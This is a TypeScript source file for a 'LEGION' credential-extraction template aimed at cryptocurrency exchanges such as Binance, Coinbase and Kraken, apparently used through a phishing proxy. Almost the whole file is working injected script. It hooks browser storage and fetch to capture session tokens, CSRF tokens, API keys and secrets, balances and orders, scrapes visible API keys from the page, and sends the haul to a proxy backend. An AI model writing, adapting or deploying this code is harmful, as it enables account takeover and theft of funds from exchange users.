/**
 * CEX EXTRACTION TEMPLATE
 *
 * Targets: Binance, Coinbase, Kraken, Bybit, OKX, MEXC, Huobi, KuCoin
 *
 * Extracts:
 * - Login credentials and session tokens
 * - API keys and trading permissions
 * - Account balances and trading history
 * - Open orders and positions
 * - 2FA status and recovery codes
 * - Withdrawal addresses and history
 * - Trading fees and maker/taker rates
 */

import { BaseExtractionTemplate, ExtractionTemplate } from '../extraction-templates.js'

export class CEXTemplate extends BaseExtractionTemplate implements ExtractionTemplate {
  name = 'CEX Extraction Template'
  category: 'cex' = 'cex'
  platforms = ['binance.com', 'coinbase.com', 'kraken.com', 'bybit.com', 'okx.com', 'mexc.com', 'huobi.com', 'kucoin.com']
  supportedChains = ['ethereum', 'bitcoin', 'solana', 'ripple', 'litecoin', 'polkadot']
  injectionPoints = ['account', 'dashboard', 'trade', 'wallet', 'portfolio', 'settings', 'api', 'withdrawal']

  extractionTargets = [
    // Authentication
    {
      name: 'session_token',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'csrf_token',
      type: 'credential' as const,
      location: 'dom' as const,
      selector: 'meta[name="csrf-token"]',
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'api_key',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'hook' as const,
    },
    {
      name: 'api_secret',
      type: 'credential' as const,
      location: 'memory' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    // Account Info
    {
      name: 'user_id',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'email',
      type: 'credential' as const,
      location: 'dom' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'account_balance',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    // Trading
    {
      name: 'open_orders',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'trading_history',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'trading_fee',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    // 2FA
    {
      name: '2fa_enabled',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: '2fa_phone',
      type: 'credential' as const,
      location: 'dom' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    // Withdrawal
    {
      name: 'withdrawal_address',
      type: 'credential' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'withdrawal_limit',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
  ]

  walletDetection = {
    detection: {
      metamask: false,
      phantom: false,
      ledger: true,
      trezor: true,
      trustwallet: false,
      coinbase: false,
      walletconnect: false,
    },
    signatureMethod: 'eth_sign' as const,
    permissionRequest: [],
  }

  apiEndpoints = [
    {
      name: 'account_info',
      method: 'GET' as const,
      path: '/api/v3/account',
      interceptionType: 'response' as const,
      dataToExtract: ['balances', 'permissions', 'accountType'],
    },
    {
      name: 'open_orders',
      method: 'GET' as const,
      path: '/api/v3/openOrders',
      interceptionType: 'response' as const,
      dataToExtract: ['orders', 'symbol', 'quantity', 'price'],
    },
    {
      name: 'trade_history',
      method: 'GET' as const,
      path: '/api/v3/myTrades',
      interceptionType: 'response' as const,
      dataToExtract: ['trades', 'commission', 'commissionAsset'],
    },
    {
      name: 'withdrawal_list',
      method: 'GET' as const,
      path: '/api/v3/withdraw/history',
      interceptionType: 'response' as const,
      dataToExtract: ['withdrawals', 'address', 'amount', 'status'],
    },
    {
      name: 'deposit_list',
      method: 'GET' as const,
      path: '/api/v3/deposit/hisrec',
      interceptionType: 'response' as const,
      dataToExtract: ['deposits', 'amount', 'confirmations'],
    },
    {
      name: 'api_key_list',
      method: 'GET' as const,
      path: '/api/v3/apiKeySecretList',
      interceptionType: 'response' as const,
      dataToExtract: ['apiKeys', 'secret', 'permissions'],
    },
  ]

  scriptContent = `
(function() {
  const LEGION_CEX = {
    platform: 'cex',
    initialized: false,
    accountAuthenticated: false,
    extractedData: {},

    async initialize() {
      console.log('[LEGION] CEX Template Initialized');

      // Detect authentication
      this.detectAuthentication();

      // Hook into localStorage/sessionStorage
      this.hookStorage();

      // Intercept API calls
      this.interceptAPICalls();

      // Monitor account pages
      this.monitorAccountPages();

      this.initialized = true;
    },

    detectAuthentication() {
      // Check for session tokens
      const tokens = [
        localStorage.getItem('access_token'),
        localStorage.getItem('auth_token'),
        sessionStorage.getItem('session_id'),
      ].filter(Boolean);

      if (tokens.length > 0) {
        this.accountAuthenticated = true;
        this.extractedData.session_token = tokens[0];
        console.log('[LEGION] Authentication detected');
      }

      // Get CSRF token
      const csrfMeta = document.querySelector('meta[name="csrf-token"]');
      if (csrfMeta) {
        this.extractedData.csrf_token = csrfMeta.getAttribute('content');
      }

      // Get user ID from DOM
      const userElement = document.querySelector('[data-user-id]');
      if (userElement) {
        this.extractedData.user_id = userElement.getAttribute('data-user-id');
      }
    },

    hookStorage() {
      const originalSetItem = Storage.prototype.setItem;
      Storage.prototype.setItem = function(key, value) {
        if (key.includes('api') || key.includes('key') || key.includes('secret') || key.includes('token')) {
          console.log('[LEGION] Storage write detected:', key);
          LEGION_CEX.extractedData[key] = value;
        }
        return originalSetItem.call(this, key, value);
      };

      // Scan existing storage
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('token') || key.includes('session')) {
          this.extractedData[key] = localStorage.getItem(key);
        }
      }
    },

    interceptAPICalls() {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const [resource, config] = args;
        const url = typeof resource === 'string' ? resource : resource.url;

        // Log API calls
        if (url.includes('/api/')) {
          console.log('[LEGION] CEX API Call:', url);
          if (config?.headers) {
            LEGION_CEX.extractedData.api_headers = config.headers;
          }
        }

        return originalFetch.apply(this, args).then(response => {
          if (url.includes('/account') || url.includes('/balance') || url.includes('/order')) {
            response.clone().json().then(data => {
              console.log('[LEGION] Account Data:', data);
              if (url.includes('/account')) {
                LEGION_CEX.extractedData.account_data = data;
              } else if (url.includes('/balance')) {
                LEGION_CEX.extractedData.balances = data;
              } else if (url.includes('/order')) {
                LEGION_CEX.extractedData.orders = data;
              }
            }).catch(() => {});
          }
          return response;
        });
      };
    },

    monitorAccountPages() {
      // Monitor navigation to account/settings pages
      const observer = new MutationObserver(() => {
        const apiKeySection = document.querySelector('[class*="api"], [id*="api"]');
        if (apiKeySection) {
          console.log('[LEGION] API key section detected');
          // Extract visible API keys
          const apiElements = apiKeySection.querySelectorAll('input, span, div');
          apiElements.forEach(el => {
            if (el.textContent && (el.textContent.length === 88 || el.textContent.length === 128)) {
              console.log('[LEGION] Potential API key found');
              LEGION_CEX.extractedData.potential_api_key = el.textContent;
            }
          });
        }
      });

      observer.observe(document.body, {
        childList: true,
        subtree: true,
      });
    },

    async sendToBackend() {
      try {
        await fetch('/__legion_proxy/api/v1/cex-extraction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            platform: 'cex',
            timestamp: new Date().toISOString(),
            data: this.extractedData,
          }),
        });
      } catch (e) {
        console.log('[LEGION] Send failed:', e);
      }
    },
  };

  window.__LEGION_EXTRACTION__ = LEGION_CEX;
})();
  `.trim()
}

/**
 * CEX template instance
 */
export const cexTemplateInstance = new CEXTemplate()
